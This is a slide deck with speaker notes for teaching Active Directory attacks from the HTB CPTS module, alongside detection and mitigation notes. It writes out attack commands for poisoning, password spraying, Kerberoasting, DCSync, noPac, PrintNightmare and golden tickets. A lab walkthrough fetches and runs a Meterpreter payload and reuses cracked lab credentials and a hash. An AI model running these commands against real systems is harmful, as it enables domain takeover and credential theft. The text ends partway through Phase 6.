---
### Slide 1 — Active Directory Enumeration & Attacks
**Visual:** text only

**Bullets** (max 5, ≤12 words each, no full sentences):
- HTB CPTS module — master reference
- External recon to **Enterprise Admin**
- Audience: peers, junior pentesters
- Linux + Windows + Kerberos
- Goal: own the full attack chain

**Speaker notes:** Welcome — this deck is the synthesis of the entire HTB CPTS Active Directory Enumeration & Attacks module. By the end you should be able to whiteboard the path from a network drop to Enterprise Admin without notes. We assume you know Linux, networking, and basic Windows; we do not assume you know Kerberos. From §1.

---
### Slide 2 — Agenda (9 sections + live labs)
**Visual:** text only

**Bullets** (max 5, ≤12 words each, no full sentences):
- Architecture — Auth — Kill Chain
- 20+ attack techniques (LLMNR → DCSync)
- Bleeding-edge CVEs + trust abuse
- Realistic chained walkthrough (10 phases)
- **Hands-on live labs** + cheat sheet + defenses

**Speaker notes:** Nine sections in source plus a hands-on lab block. We start with architecture and authentication theory because every attack is an abuse of a legitimate AD feature. Then the global kill chain. Then individual techniques. Then a real 10-phase chained engagement. Then we drop into the terminal for the live labs (skills-assessment-part1 and part2 from the vault). Then defenses and references. Stop me at any time.

---
### Slide 3 — §1 Executive Overview
**Visual:** text only

**Bullets** (max 5, ≤12 words each, no full sentences):
- AD in **~43%** of enterprises
- DC knows every credential, trusts every host
- Single privileged compromise → domain ownership
- Most "attacks" are feature **abuse**
- Chain understanding > single-CVE knowledge

**Speaker notes:** AD authenticates every user and authorises every resource. The Domain Controller is the single point of trust — own it and you own the org. The realistic workflow is recon, foothold, credentialed enum, abuse, DCSync, Golden Ticket, Enterprise Admin. Almost none of this is CVE-driven; it's Kerberos, ACLs, and weak passwords. From §1.

---
### Slide 4 — Section 2: AD Architecture Fundamentals
**Visual:** text only

**Bullets** (max 5, ≤12 words each, no full sentences):
- Section 2

**Speaker notes:** Section divider. We move into the building blocks: domains, trees, forests, OUs, GPOs, DCs, the schema, FSMO roles, and AD-integrated DNS. The forest is the true security boundary — remember that one line.

---
### Slide 5 — AD Building Blocks
**Visual:** table: Concept → one-line definition (from §2)

**Bullets** (max 5, ≤12 words each, no full sentences):
- **Forest** = true security boundary
- **Domain** = policy + DB boundary
- **OU** delegates rights, applies **GPO**
- **DC** hosts `ntds.dit`
- **5 FSMO** roles split forest/domain

**Analogy:** Picture a corporate office tower. The **Forest** is the whole property line (the real fence). A **Domain** is a floor with its own keycard system. An **OU** is an office suite where local house rules apply (GPOs). The **DC** is the building's master key cabinet — and `ntds.dit` is the keychain inside it.

**Speaker notes:** Walk the table top-to-bottom. The two takeaways: the forest — not the domain — is the real security boundary, and a single DC has the keys to the kingdom because it stores ntds.dit. Global Catalog on TCP 3268 is what makes cross-domain searches possible. From §2.

---
### Slide 6 — Forest Topology
**Visual:** mermaid: Forest topology flowchart from §2

**Bullets** (max 5, ≤12 words each, no full sentences):
- Forest contains root + child domains
- OUs hold users, computers, GPOs
- Foreign forest joined by **Forest Trust**
- Trust is dotted — manually configured

**Speaker notes:** This is what a real enterprise forest looks like — INLANEFREIGHT.LOCAL with a LOGISTICS child domain, OUs for IT Admins and Servers, and a forest trust to FREIGHTLOGISTICS.LOCAL. Notice the dotted line: forest trusts are explicit, not automatic. Inside the forest, parent-child trusts are auto-created. From §2.

---
### Slide 7 — Trust Types
**Visual:** mermaid: Trust types flowchart from §2

**Bullets** (max 5, ≤12 words each, no full sentences):
- Parent-child / tree-root: **auto, transitive**
- Forest trust: **manual, transitive**
- External: single domain, **non-transitive**
- Shortcut: speed-up between child domains
- Realm: bridge to MIT Kerberos

**Analogy:** Sister hotels honoring each other's wristbands. **Parent-child** = floors of the same hotel — automatic trust, no paperwork. **Forest trust** = two sister hotels signing an explicit deal. **External trust** = one-off friendship between two single hotels. **Shortcut trust** = punching a hallway between distant rooms so guests stop walking the long way.

**Speaker notes:** Five trust types. The two that matter for offense: parent-child (we'll abuse with ExtraSids in §5) and forest trust (cross-forest Kerberoasting in §5). External trusts have SID Filtering on by default — that's the defense ExtraSids attacks rely on being absent intra-forest. From §2.

---
### Slide 8 — Section 3: Authentication Deep-Dive
**Visual:** text only

**Bullets** (max 5, ≤12 words each, no full sentences):
- Section 3

**Speaker notes:** Section divider. Two protocols matter: NTLM, the legacy challenge-response, and Kerberos, the default since Windows 2000. Both are cracked in this module — different ways, different hashcat modes.

---
### Slide 9 — NTLM in 30 Seconds
**Visual:** text only

**Bullets** (max 5, ≤12 words each, no full sentences):
- Server sends 8-byte challenge
- Client returns **HMAC-MD5** response
- DC verifies via NETLOGON
- `Net-NTLMv2` = hashcat mode **5600**
- Raw NT hash = mode **1000** (PtH-able)

**Analogy:** A bouncer whispers a random word; you must whisper it back, scrambled with your password as the scrambler key. The bouncer phones HQ to confirm. **NetNTLMv2** is the scrambled whisper — useless until we crack it back to the password. The **raw NT hash** is the scrambler key itself — hand it to a different bouncer and they let you in without asking questions (pass-the-hash).

**Speaker notes:** Five steps: NEGOTIATE, challenge, response, DC verify, allow/deny. The response is Net-NTLMv2 — that's what Responder captures and what we crack offline with mode 5600. Critically, Net-NTLMv2 is NOT pass-the-hashable. Only the raw NT hash from a SAM/LSASS dump is. From §3.

---
### Slide 10 — Kerberos Full Flow
**Visual:** mermaid: Kerberos sequenceDiagram from §3

**Bullets** (max 5, ≤12 words each, no full sentences):
- AS-REQ/REP → **TGT** (KRBTGT-encrypted)
- TGS-REQ/REP → **service ticket**
- AP-REQ/REP → service auth
- Steal KRBTGT hash → **Golden Ticket**
- Disabled pre-auth → **AS-REP roast**

**Analogy:** An all-inclusive resort. Check in once at the front desk and they hand you a wristband (**TGT**) signed in the resort owner's invisible ink (**KRBTGT**). Want a drink at the bar? Flash the wristband, the desk hands you a drink ticket (**TGS**) signed in the bartender's ink. Bar accepts the ticket. Steal the owner's invisible-ink pen (**KRBTGT hash**) and you can forge wristbands to anything, forever — that's a **Golden Ticket**.

**Diagram help:** For a clearer visual mid-talk, Sean Metcalf's Kerberos flow diagrams at *adsecurity.org* are the cleanest public reference; SpecterOps' *Kerberos cheat-sheet* is also widely shared.

**Speaker notes:** Six messages, two KDC roles. The TGT is encrypted with the KRBTGT account's NT hash — that's the kingdom key. The TGS is encrypted with the service account's NT hash — that's what Kerberoasting cracks. If pre-authentication is disabled on a user, you can request an AS-REP with no creds and crack it offline as mode 18200. From §3.

---
### Slide 11 — NTLM vs Kerberos
**Visual:** table: NTLM vs Kerberos comparison from §3

**Bullets** (max 5, ≤12 words each, no full sentences):
- Kerberos: mutual auth, AES-256
- Kerberos roast modes: **13100** RC4, **19700** AES
- NTLM relay risk: **high** without SMB signing
- Kerberos clock skew **>5 min** = fail
- NTLM still everywhere — legacy fallback

**Speaker notes:** Kerberos wins on cryptography and mutual auth, but NTLM is still alive in every enterprise as fallback. Note the time-sensitivity — if your attack box clock drifts more than 5 minutes you'll get cryptic Kerberos errors. RC4 TGS cracks 70x faster than AES, which is why Rubeus has /tgtdeleg. From §3.

---
### Slide 12 — Section 4: The Kill Chain
**Visual:** text only

**Bullets** (max 5, ≤12 words each, no full sentences):
- Section 4

**Speaker notes:** Section divider. This next slide is the single most important picture in the module — the global attacker roadmap. Every later slide is a node on this graph.

---
### Slide 13 — Global Kill Chain
**Visual:** mermaid: Kill Chain flowchart from §4

**Bullets** (max 5, ≤12 words each, no full sentences):
- Recon → **foothold** → credentialed enum
- Foothold via poison **or** spray
- BloodHound maps the attack paths
- DCSync delivers **KRBTGT** + DA hash
- Trusts extend DA → **Enterprise Admin**

**Analogy:** A heist movie in five acts: **case the joint** (recon), **grab the janitor's keys** (foothold via poison or spray), **map the vault** (BloodHound), **blackmail a weak guard** (Kerberoast / ACL chain / CVE), **photocopy the master keyring** (DCSync), then **forge ID badges that work forever** (Golden Ticket → Enterprise Admin across trusts).

**Speaker notes:** Read the diagram left to right, top to bottom. Two paths to first creds — LLMNR poisoning or password spray. Once credentialed, BloodHound becomes the brain. Three abuse families: Kerberoasting, ACL chains, and CVE escalations. All converge on DCSync, which gives KRBTGT, which gives Golden Tickets, which extend across trusts to Enterprise Admin. From §4.

---
### Slide 14 — Section 5: Attack Techniques
**Visual:** text only

**Bullets** (max 5, ≤12 words each, no full sentences):
- Section 5

**Speaker notes:** Section divider. We now walk every technique on the kill chain. Order roughly matches the chain: poisoning, recon, enumeration, then escalation primitives.

---
### Slide 15 — LLMNR / NBT-NS Poisoning
**Visual:** code: `sudo responder -I ens224`

**Bullets** (max 5, ≤12 words each, no full sentences):
- Windows fallback: DNS → **LLMNR** → NBT-NS
- Attacker answers broadcast, captures **NetNTLMv2**
- Crack offline: `hashcat -m 5600`
- Tools: **Responder** (Linux), **Inveigh** (Windows)
- MITRE **T1557.001**

**Analogy:** A confused tourist gets lost and shouts down a busy street, "Where's the Hilton?!" You shout back, "Right here — sign in!" and slide them your guestbook. They sign without looking up. You take the signature home and forge their identity at leisure. Responder is your shouting-back voice; the signature is `NetNTLMv2`.

**Speaker notes:** When DNS fails, Windows broadcasts on UDP 5355 then 137 asking "who is printer01?" Any host on the segment can answer. Responder answers yes, victim sends NetNTLMv2, we crack offline. Prereq is just layer-2 access. Lab cracked backupagent, wley, svc_qualys with rockyou. Mitigation is a one-line GPO. From §5.

---
### Slide 16 — LLMNR Mind Map
**Visual:** mermaid: LLMNR/NBT-NS mindmap from §5

**Bullets** (max 5, ≤12 words each, no full sentences):
- Prereq: same broadcast domain
- Steps: analyse → poison → crack
- Detection: UDP 5355/137, events 4697/7045
- Mitigation: GPO + SMB signing

**Speaker notes:** Mind map view — same content, different shape. Useful for fast recall in a real engagement. The detection branch is what blue team will look for: a sudden spike in UDP 5355 or events 4697/7045 from a relay. From §5.

---
### Slide 17 — External Recon
**Visual:** text only

**Bullets** (max 5, ≤12 words each, no full sentences):
- ASN/IP — IANA, ARIN, **bgp.he.net**
- DNS — `dig any`, `dig txt mx ns`
- Usernames — LinkedIn + **linkedin2username**
- Breach data — HIBP, Dehashed
- MITRE **T1589 / T1590**

**Speaker notes:** Before any packet hits the target — public sources only. ASN gives IP space, DNS gives subdomains, LinkedIn gives the username schema, HIBP gives reusable passwords for VPN portals. Trufflehog and Greyhat Warfare for leaked keys and config files. From §5.

---
### Slide 18 — Initial Domain Enumeration
**Visual:** code: `kerbrute userenum -d INLANEFREIGHT.LOCAL --dc 172.16.5.5 jsmith.txt`

**Bullets** (max 5, ≤12 words each, no full sentences):
- Passive `tcpdump` + Responder analyse mode
- ICMP sweep with `fping -asgq`
- Nmap fingerprint readable hosts
- Kerbrute = **stealthiest** user enum
- Anonymous SMB / LDAP probes

**Speaker notes:** From the unauthenticated drop you want three things: live hosts, the DC's IP, and a valid username list. Kerbrute hits Kerberos pre-auth — only logs Event 4768, not the noisy 4625. That's why it's preferred over rpcclient enumdomusers when stealth matters. From §5.

---
### Slide 19 — Password Policy Enumeration
**Visual:** code: `crackmapexec smb 172.16.5.5 -u user -p pass --pass-pol`

**Bullets** (max 5, ≤12 words each, no full sentences):
- Pull `lockoutThreshold` **before** spraying
- Null SMB: `rpcclient -U "" -N` → `getdompwinfo`
- LDAP anon: `ldapsearch ... pwdHistoryLength`
- Negative duration = 100-ns intervals
- MITRE **T1201**

**Speaker notes:** Spray without checking lockout and you DOS the entire domain — instant engagement-ender. Get lockoutThreshold and lockoutDuration first. The duration value is in negative 100-nanosecond intervals; -18000000000 means 30 minutes. Five attempts before lockout means cap at 2-3 per round. From §5.

---
### Slide 20 — Building a User List
**Visual:** split: `enum4linux -U` / `kerbrute userenum` | `crackmapexec --users` / `windapsearch -U`

**Bullets** (max 5, ≤12 words each, no full sentences):
- enum4linux + grep parse
- rpcclient `enumdomusers`
- CME `--users` shows badpwdcount
- ldapsearch `sAMAccountName`
- **Kerbrute** = stealthiest

**Speaker notes:** Five tools, same goal. CME is uniquely useful because it gives badpwdcount per user — accounts close to lockout you skip in your spray. Kerbrute leaves the smallest event-log footprint. Mix two tools and dedupe; never trust just one. From §5.

---
### Slide 21 — Password Spraying
**Visual:** code: `kerbrute passwordspray -d inlanefreight.local --dc DC valid_users.txt Welcome1`

**Bullets** (max 5, ≤12 words each, no full sentences):
- One password → many users
- Candidates: `Welcome1`, `Winter2022`, `Company2024`
- Linux: rpcclient / kerbrute / **CME**
- Windows: `Invoke-DomainPasswordSpray`
- MITRE **T1110.003**

**Analogy:** Brute force = trying 10,000 keys on one door — alarm goes off in seconds. Spraying = trying **one** key (`Welcome1`) on **every** door in the apartment block. No single door notices a wrong key once. Welcome1 opens more doors than anyone wants to admit.

**Speaker notes:** Inverse of brute force — one password per round. DomainPasswordSpray honours the lockout policy automatically. Always include the company name + current year as a candidate. The local-admin hash spray with CME --local-auth is the highest-ROI move on most engagements. From §5.

---
### Slide 22 — Brute Force vs Spray
**Visual:** table: Brute force vs Spray comparison from §5

**Bullets** (max 5, ≤12 words each, no full sentences):
- Brute: many pwds, **1 user**, lockout
- Spray: 1 pwd, **many users**, stealth
- Brute = targeted post-foothold
- Spray = wide initial access
- Gotcha: `--local-auth` for local hash spray

**Speaker notes:** Different tools for different jobs. Spray to get in. Brute force a single juicy account once you know it (e.g., a service account you can't Kerberoast). The --local-auth gotcha bites everyone once — without it, CME tries domain auth and locks the built-in Administrator. From §5.

---
### Slide 23 — Security Controls Recon
**Visual:** code: `Get-MpComputerStatus ; Get-AppLockerPolicy -Effective`

**Bullets** (max 5, ≤12 words each, no full sentences):
- `Get-MpComputerStatus` — Defender state
- `Get-AppLockerPolicy -Effective` — whitelist
- `$ExecutionContext.SessionState.LanguageMode`
- `Find-LAPSDelegatedGroups` — LAPS readers
- AppLocker often forgets **SysWOW64**

**Speaker notes:** Before dropping tools, see what blocks them. Defender, AppLocker, Constrained Language Mode, LAPS. Famous bypass: AppLocker rules forget the 32-bit PowerShell at C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe. From §5.

---
### Slide 24 — Credentialed Enumeration (Linux)
**Visual:** code: `bloodhound-python -u U -p P -ns DC -d DOM -c all`

**Bullets** (max 5, ≤12 words each, no full sentences):
- CME: `--users --groups --shares --loggedon-users`
- `(Pwn3d!)` = local admin marker
- `smbmap` for share permission grid
- `windapsearch -PU --da` for privileged
- BloodHound = **the brain**

**Speaker notes:** From one valid credential, enumerate everything. CME gives you the Pwn3d marker, smbmap shows share ACLs, windapsearch pulls privileged users via LDAP. The headline tool is bloodhound-python with -c all — collects users, groups, ACLs, sessions, GPOs, trusts in one shot. From §5.

---
### Slide 25 — Credentialed Enumeration (Windows)
**Visual:** code: `.\SharpHound.exe -c All --zipfilename ilf.zip`

**Bullets** (max 5, ≤12 words each, no full sentences):
- `Get-ADDomain ; Get-ADTrust -Filter *`
- PowerView: `Get-DomainUser` deep dive
- **Snaffler** color-codes share files
- `Test-AdminAccess` per host
- BloodHound queries: **Shortest Path to DA**

**Speaker notes:** On a domain-joined box, ActiveDirectory PS module + PowerView + SharpHound. First BloodHound queries to run: Kerberoastable Accounts, Computers where Domain Users are Local Admin, Shortest Path to Domain Admins, Computers with Unsupported OS, Map Domain Trusts. Snaffler is the king of share creds hunting. From §5.

---
### Slide 26 — Living Off The Land
**Visual:** code: `net group "Domain Admins" /domain`

**Bullets** (max 5, ≤12 words each, no full sentences):
- `systeminfo` — OS, patches, domain
- `net group / net localgroup / net user`
- `wmic ntdomain list /format:list`
- `dsquery` with **LDAP OIDs**
- `net1` slips string-based EDR

**Speaker notes:** When you can't drop tools — locked-down host, no internet, EDR on alert — use only built-ins. Memorise the LDAP OIDs: 803 bitwise AND, 804 OR, 1941 recursive DN membership. Pro tip: net1.exe is the alternate name and bypasses naive string detections. From §5.

---
### Slide 27 — Kerberoasting
**Visual:** code: `GetUserSPNs.py -dc-ip DC DOM/U -request`

**Bullets** (max 5, ≤12 words each, no full sentences):
- Any domain user → request **TGS** for SPN
- TGS encrypted with service NT hash
- RC4 (**13100**) cracks **70× faster** than AES
- Service accts often = **Domain Admins**
- MITRE **T1558.003**

**Analogy:** Walk up to the front desk and ask, "Can I have a meeting pass to see the Server Admin?" The desk hands you a sealed envelope addressed to that admin — sealed with the admin's personal wax stamp (their **NTLM hash**). You take the envelope home and slowly steam it open in your kitchen for hours, days, weeks (offline cracking). Service accounts use weak waxes.

**Speaker notes:** The flagship AD attack. Any authenticated user can request a TGS for any account that has an SPN. The TGS is encrypted with the service account's NT hash, so we crack offline. Service accounts are notoriously over-privileged. Use Rubeus /tgtdeleg on pre-2019 DCs to force RC4 — much faster crack. From §5.

---
### Slide 28 — Kerberoasting Mind Map
**Visual:** mermaid: Kerberoasting mindmap from §5

**Bullets** (max 5, ≤12 words each, no full sentences):
- Steps: enum SPNs → request → crack
- Tools: Rubeus, Invoke-Kerberoast, GetUserSPNs.py
- Detection: **Event 4769** burst
- Mitigation: **gMSA** + AES enctype

**Speaker notes:** Same content, fast-recall view. Detection signal is a burst of 4769 events from one user, especially with RC4 enctype 0x17. The proper fix is gMSA — group Managed Service Accounts have a 240-character password that rotates automatically. Honeypot SPN account is a great detective control. From §5.

---
### Slide 29 — ACL Primer
**Visual:** table: Key ACEs to hunt from §5

**Bullets** (max 5, ≤12 words each, no full sentences):
- **WriteDACL** = most dangerous single ACE
- **GenericAll** = full control
- **GenericWrite** → set fake SPN → roast
- **ForceChangePassword** = no-knowledge reset
- DS-Replication-Get-Changes = **DCSync**

**Analogy:** ACLs are the building's badge permissions. **WriteDACL** = the badge programmer — no master key, but they can issue any badge to anyone, including themselves. **GenericAll** = a copy of the master key. **ForceChangePassword** = the locksmith — they swap any lock without knowing the old combination. The two **Replication** rights together = "satellite-office sync clearance" — DCSync.

**Diagram help:** harmj0y's *"An ACE Up the Sleeve"* (SpecterOps blog, 2017) has the canonical visual of these primitives chained.

**Speaker notes:** Every AD object has a DACL of ACEs. Memorise this table — it's the entire vocabulary of ACL abuse. WriteDACL is worst because it lets you grant yourself any other ACE. The two replication ACEs together equal DCSync rights, which is the holy grail. ACL misconfigs are invisible to vuln scanners. From §5.

---
### Slide 30 — ACL Enumeration
**Visual:** code: `Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid}`

**Bullets** (max 5, ≤12 words each, no full sentences):
- Walk outward from controlled SIDs
- Always pass `-ResolveGUIDs`
- BloodHound: **Outbound Object Control**
- Pivot: each new SID re-runs the query
- Lab chain: wley → damundsen → IT → adunn

**Speaker notes:** Without -ResolveGUIDs, ObjectAceType is a raw GUID — useless. The lab chain is the canonical example: wley has ForceChangePassword on damundsen, damundsen has GenericWrite on Help Desk Level 1, which nests into Information Technology, which has GenericAll on adunn, who has DCSync. Five hops. BloodHound visualises this in one click. From §5.

---
### Slide 31 — ACL Chain Abuse — Full Lab
**Visual:** code: `Set-DomainUserPassword -Identity damundsen -AccountPassword $P -Credential $C`

**Bullets** (max 5, ≤12 words each, no full sentences):
- Reset → re-auth → add to group → set SPN
- Roast adunn, crack offline
- **Cleanup in reverse order**
- Detect via **Event 5136** + SDDL decode
- Mitigation: tier-0 isolation

**Analogy:** Six Degrees of Kevin Bacon, but for breaking into the CEO's office. The night janitor knows the cleaning supervisor's password; the supervisor can change the helpdesk's password; the helpdesk resets the CEO's assistant; the assistant can sign timesheets for the CEO. **BloodHound** is the casting director who maps the entire chain in one click. Cleanup is undoing each favor in reverse — or you lose the access to undo the next one.

**Speaker notes:** Five-step abuse chain: reset damundsen, re-auth, add to Help Desk Level 1, set fake SPN on adunn, Kerberoast adunn. Then crack. Critical — clean up in reverse order or you lose the rights to clean up. Defender side, Event 5136 with ConvertFrom-SddlString shows what changed. From §5.

---
### Slide 32 — ACL Chain Mind Map
**Visual:** mermaid: ACL Chain Abuse mindmap from §5

**Bullets** (max 5, ≤12 words each, no full sentences):
- Discovery → ACE primitives → tooling
- Cleanup: **reverse last action first**
- Detection: 5136 + repeated DACL edits
- Visual reminder of the full attack tree

**Speaker notes:** Mind-map view of the same chain. Useful when explaining to clients or blue team. Notice cleanup is its own branch — that's how seriously you should take it. Repeated DACL edits is the strongest detection signal. From §5.

---
### Slide 33 — DCSync
**Visual:** code: `secretsdump.py -just-dc INLANEFREIGHT/adunn@DC`

**Bullets** (max 5, ≤12 words each, no full sentences):
- MS-DRSR replication abused remotely
- Need **Get-Changes + Get-Changes-All**
- Pulls every NTLM hash + KRBTGT
- No code execution on DC required
- MITRE **T1003.006**

**Analogy:** Phone the corporate HR system pretending to be a satellite office: *"Hi, Tokyo branch here, please send a copy of every employee's payroll record for sync."* HR doesn't check the caller-ID — sends them all. **AD replication** does the exact same thing. No one shows up at the actual HQ — the request just looks like normal sync chatter on the wire.

**Speaker notes:** AD's own replication protocol becomes the exfil channel. With both replication ACEs, your non-DC user impersonates a DC and pulls every secret. Linux: secretsdump.py. Windows: mimikatz lsadump::dcsync. Detect via Event 4662 with the replication property GUIDs from non-DC source IPs. From §5.

---
### Slide 34 — Privileged Access Patterns
**Visual:** split: WinRM `evil-winrm -i IP -u U -H NTHASH` | SQL `mssqlclient.py DOM/U@IP -windows-auth`

**Bullets** (max 5, ≤12 words each, no full sentences):
- RDP / WinRM / SQLAdmin = lateral
- **No local admin needed**
- SQL service account → `SeImpersonate` → SYSTEM
- `Domain Users` in RDP group = catastrophe
- **Double-hop** breaks PowerView remotely

**Speaker notes:** Lateral movement does not require local admin. Membership in Remote Desktop Users, Remote Management Users, or SQL sysadmin is enough. The SQL service account almost always has SeImpersonatePrivilege, which is an instant SYSTEM ramp via JuicyPotato or PrintSpoofer. The double-hop bites everyone — Enter-PSSession only forwards a service ticket, not your TGT. From §5.

---
### Slide 35 — NoPac (CVE-2021-42278/42287)
**Visual:** code: `noPac.py DOM/U:P -dc-ip DC -dc-host H -shell --impersonate administrator`

**Bullets** (max 5, ≤12 words each, no full sentences):
- Rename machine acct to look like DC
- S4U2self for Administrator
- Need `ms-DS-MachineAccountQuota` **≥ 1**
- One low-priv user → instant DA
- Patched November 2021

**Analogy:** Rename your office Slack handle to **"CEO Bob"**, then DM the IT bot saying *"forgot my admin password."* The bot reads the name "CEO Bob" and resets it without checking IDs. NoPac renames a low-privilege computer account to look like a Domain Controller, then asks the real DC for an admin ticket — and gets one.

**Speaker notes:** Rename a machine account to the DC's name, request a TGT, then S4U2self as Administrator — broken PAC validation makes the DC issue admin tickets. Default MAQ is 10. If admin set MAQ=0, attack fails. Otherwise it's a one-shot from any low-priv user to Domain Admin. From §5.

---
### Slide 36 — PrintNightmare + PetitPotam
**Visual:** split: `python3 CVE-2021-1675.py DOM/U:P@DC '\\US\share\evil.dll'` | `python3 PetitPotam.py US DC` + `ntlmrelayx --adcs`

**Bullets** (max 5, ≤12 words each, no full sentences):
- PrintNightmare: Spooler loads attacker DLL as SYSTEM
- PetitPotam: **unauth** EFSRPC coercion
- Relay → AD CS → cert → TGT → DCSync
- Mitigation: disable **Spooler** on every DC
- AD CS: enforce HTTPS + EPA

**Analogy:** **PrintNightmare** — the office printer accepts any "driver" you hand it and runs the install as a janitor with a master key. **PetitPotam** — prank-call the Domain Controller from a number it trusts; it dutifully calls back and reads its own credentials over the line. Then relay those credentials to the certificate office, which prints you a permanent ID badge as the DC itself.

**Speaker notes:** Two more one-shot DA escalations. PrintNightmare needs an exposed Print Spooler — RPC dump first to confirm, then drop a malicious DLL on a share. PetitPotam is even better — fully unauthenticated coercion. Relay the DC's machine auth to AD CS web enrollment, get a DC certificate, use PKINIT to forge a TGT, then DCSync. Disable spooler on DCs, period. From §5.

---
### Slide 37 — Bleeding-Edge Mind Map
**Visual:** mermaid: Bleeding edge mindmap from §5

**Bullets** (max 5, ≤12 words each, no full sentences):
- Three CVEs, three escalation paths
- All require **one low-priv user** (or none)
- Patches exist — but adoption lags
- Use cube0x0 fork for PrintNightmare

**Speaker notes:** Mind-map summarising NoPac, PrintNightmare, and PetitPotam. The common thread is they all turn a low-priv credential into Domain Admin in minutes. PetitPotam doesn't even need a credential. Patch coverage in real environments is poor — these still hit on engagements four years on. From §5.

---
### Slide 38 — Domain Trusts Primer
**Visual:** code: `Get-ADTrust -Filter *`

**Bullets** (max 5, ≤12 words each, no full sentences):
- `IntraForest: True` = parent/child
- `ForestTransitive: True` = forest trust
- `Direction: BiDirectional` = both ways
- PowerView: `Get-DomainTrustMapping`
- `netdom query /domain:X trust`

**Speaker notes:** Four ways to enumerate trusts — pick whichever your foothold supports. Read the flags carefully: IntraForest tells you it's a parent/child within one forest, which means SID Filtering is off and ExtraSids will work. ForestTransitive means cross-forest, where SID Filtering is on. From §5.

---
### Slide 39 — Child → Parent Trust Abuse
**Visual:** code: `ticketer.py -nthash KRBTGT -domain-sid CHILDSID -extra-sid PARENTSID-519 hacker`

**Bullets** (max 5, ≤12 words each, no full sentences):
- Need **child KRBTGT** hash (DCSync)
- Forge Golden Ticket with **ExtraSid -519**
- Parent honours claim — SID Filter off intra-forest
- Auto-pwn: `raiseChild.py`
- Result: **Enterprise Admin**

**Analogy:** Sister hotels honor each other's "VIP Owner" wristbands. Steal the kid hotel's wristband-signing pen (**child KRBTGT hash**) and hand-write *"VIP Owner of the entire chain"* on a wristband — the parent hotel waves you straight through. Cross-forest, customs strips the bonus claims (**SID Filtering** is on), so this trick stops at the property line.

**Speaker notes:** If you own a child domain, you own the forest. DCSync the child KRBTGT, forge a Golden Ticket whose ExtraSids contains the parent forest's Enterprise Admins SID with RID 519. Parent KDC honours the claim because intra-forest SID Filtering is off by default. Or just run raiseChild.py and watch it happen. From §5.

---
### Slide 40 — Cross-Forest Trust Abuse
**Visual:** code: `GetUserSPNs.py -target-domain FOREIGN CUR/U -request`

**Bullets** (max 5, ≤12 words each, no full sentences):
- SID Filtering blocks ExtraSids cross-forest
- **Cross-forest Kerberoast** still works
- Admin password reuse between forests
- **Foreign Group Membership** = paths
- BloodHound: Users w/ Foreign Domain Membership

**Speaker notes:** Across forests, SID Filtering strips ExtraSids — so the child-to-parent trick fails. Four real avenues remain: cross-forest Kerberoast, password reuse, Foreign Group Membership (a Domain Local group in forest B containing a user from forest A), and SID History abuse where filtering is misconfigured. BloodHound's Foreign Domain Group Membership query lights all this up. From §5.

---
### Slide 41 — Section 6: Chained Walkthrough
**Visual:** text only

**Bullets** (max 5, ≤12 words each, no full sentences):
- Section 6

**Speaker notes:** Section divider. Theory is over. Now we walk a real engagement: ten phases from a network drop to leaving with KRBTGT in hand. Premise: you're plugged into 172.16.7.0/23, no creds.

---
### Slide 42 — Phase 1: LLMNR Foothold
**Visual:** code: `sudo responder -I ens224` then `hashcat -m 5600 ab920.hash rockyou.txt`

**Bullets** (max 5, ≤12 words each, no full sentences):
- Plug in, fire Responder, **wait**
- Captured `AB920` NetNTLMv2
- Cracked offline → password `weasal`
- First valid domain credential
- Unlocks SMB, LDAP, Kerberos, BloodHound

**Speaker notes:** Phase one is doing nothing. Plug into the segment and let Windows hosts mistype names. Within minutes, AB920's NetNTLMv2 is in our hands. Rockyou cracks it to weasal. We now have the keys to start credentialed enumeration — every door in §5 just opened. From §6.

---
### Slide 43 — Phase 2: Recon & First Pivot
**Visual:** code: `evil-winrm -i 172.16.7.50 -u 'ab920' -p 'weasal'`

**Bullets** (max 5, ≤12 words each, no full sentences):
- `fping -asgq 172.16.7.0/23`
- `nmap -A` against live hosts
- `crackmapexec winrm` to find access
- Evil-WinRM into **MS01**
- Foothold confirmed, no tools dropped

**Speaker notes:** Sweep the subnet, fingerprint, then ask CME which hosts AB920 can WinRM into. Answer: MS01 at 172.16.7.50. Evil-WinRM gives us a PowerShell prompt without dropping anything. We grab the flag and prepare to spray internally. From §6.

---
### Slide 44 — Phase 3: Internal Spray
**Visual:** code: `kerbrute passwordspray -d inlanefreight.local --dc 172.16.7.3 valid_users.txt Welcome1`

**Bullets** (max 5, ≤12 words each, no full sentences):
- Pull domain users via `cme --users`
- Awk-clean the list
- Spray `Welcome1` with kerbrute
- Hit: **`BR086:Welcome1`**
- Compounded reach — different group memberships

**Speaker notes:** Now spray internally. CME --users gives us every domain account. Pipe through awk to extract just samaccountnames. Kerbrute sprays Welcome1 — a lazy seasonal classic. BR086 falls. We now have two low-priv accounts; their group memberships rarely overlap, so attack surface roughly doubles. From §6.

---
### Slide 45 — Phase 4: Hunting Share Creds
**Visual:** code: `smbmap -u br086 -p Welcome1 -H 172.16.7.3 -R 'Department Shares' -A web.config`

**Bullets** (max 5, ≤12 words each, no full sentences):
- smbmap recursively scrapes shares
- Filter for `web.config`
- Found `netdb / D@ta_bAse_adm1n!`
- Targets **SQL01**
- SQL svc accts → SeImpersonate → SYSTEM

**Speaker notes:** With BR086 we can read more shares. Spider Department Shares for web.config files — ASP.NET apps love hardcoded SQL connection strings. Bingo: netdb with D@ta_bAse_adm1n! for SQL01. SQL service accounts almost always hold SeImpersonatePrivilege, so this is a clear path to SYSTEM. From §6.

---
### Slide 46 — Phase 5: SQL → SYSTEM
**Visual:** code: `xp_cmdshell "C:\Users\Public\shell.exe"` then `getsystem`

**Bullets** (max 5, ≤12 words each, no full sentences):
- Auth to MSSQL with stolen creds
- `enable_xp_cmdshell`
- Stage Meterpreter via `certutil`
- Execute, catch in handler
- `getsystem` via SeImpersonate

**Speaker notes:** Connect with mssqlclient.py, enable xp_cmdshell, use certutil to download our msfvenom Meterpreter from a Python http.server, execute it. Back in the handler, getsystem leverages SeImpersonatePrivilege via the same primitive PrintSpoofer uses. We are now SYSTEM on SQL01. From §6.

---
### Slide 47 — Phase 6: Pass-the-Hash Lateral
**Visual:** code: `evil-winrm -i 172.16.7.50 -u administrator -H bdaffbfe64f1fc646a3353be1c2c3c99`

**Bullets** (max 5, ≤12 words each, no full sentences):
- `load kiwi` → `lsa_dump_sam`
- Local admin NTLM exfiltrated
- PtH back to **MS01**
- Gold-image password reuse is endemic
- Now ready to RDP / Mimikatz

